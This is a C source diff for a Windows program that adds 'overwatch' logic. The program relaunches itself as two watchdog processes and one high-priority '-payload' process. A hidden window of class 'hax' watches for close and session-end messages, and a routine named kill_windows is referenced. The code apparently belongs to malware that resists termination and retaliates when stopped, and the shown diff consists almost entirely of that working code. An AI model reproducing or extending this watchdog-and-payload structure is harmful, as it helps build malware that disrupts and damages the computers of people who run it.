@@ -61,7 +61,7 @@ static void kill_windows()
 #endif
 }
 
-DWORD WINAPI overwatch_thread(LPVOID parameter)
+static DWORD WINAPI overwatch_thread(LPVOID parameter)
 {
     int oproc = 0;
 
@@ -103,9 +103,10 @@ DWORD WINAPI overwatch_thread(LPVOID parameter)
 
         Sleep(10);
     }
+    return 0;
 }
 
-LRESULT CALLBACK window_proc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
+static LRESULT CALLBACK window_proc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
     if (msg == WM_CLOSE || msg == WM_ENDSESSION)
     {
@@ -114,4 +115,58 @@ LRESULT CALLBACK window_proc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
     }
 
     return DefWindowProc(hwnd, msg, wParam, lParam);
+}
+
+void start_overwatch()
+{
+    LPSTR fn = (LPSTR)LocalAlloc(LMEM_ZEROINIT, 8192*2);
+    GetModuleFileName(NULL, fn, 8192);
+
+    for (int i = 0; i < 2; i++)
+        ShellExecute(NULL, NULL, fn, "-overwatch", NULL, SW_SHOWDEFAULT);
+
+    SHELLEXECUTEINFO info;
+    info.cbSize = sizeof(SHELLEXECUTEINFO);
+    info.lpFile = fn;
+    info.lpParameters = "-payload";
+    info.fMask = SEE_MASK_NOCLOSEPROCESS;
+    info.hwnd = NULL;
+    info.lpVerb = NULL;
+    info.lpDirectory = NULL;
+    info.hInstApp = NULL;
+    info.nShow = SW_SHOWDEFAULT;
+
+    ShellExecuteEx(&info);
+    SetPriorityClass(info.hProcess, HIGH_PRIORITY_CLASS);
+    ExitProcess(0);
+}
+
+void overwatch()
+{
+    CreateThread(NULL, 0, overwatch_thread, NULL, 0, 0);
+
+    WNDCLASSEXA c;
+    c.cbSize = sizeof(WNDCLASSEXA);
+    c.lpfnWndProc = window_proc;
+    c.lpszClassName = "hax";
+    c.style = 0;
+    c.cbClsExtra = 0;
+    c.cbWndExtra = 0;
+    c.hInstance = NULL;
+    c.hIcon = 0;
+    c.hCursor = 0;
+    c.hbrBackground = 0;
+    c.lpszMenuName = NULL;
+    c.hIconSm = 0;
+
+    RegisterClassExA(&c);
+
+    CreateWindowExA(0, "hax", NULL, 0, 0, 0, 100, 100, NULL, NULL, NULL, NULL);
+
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0) > 0)
+    {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
 }
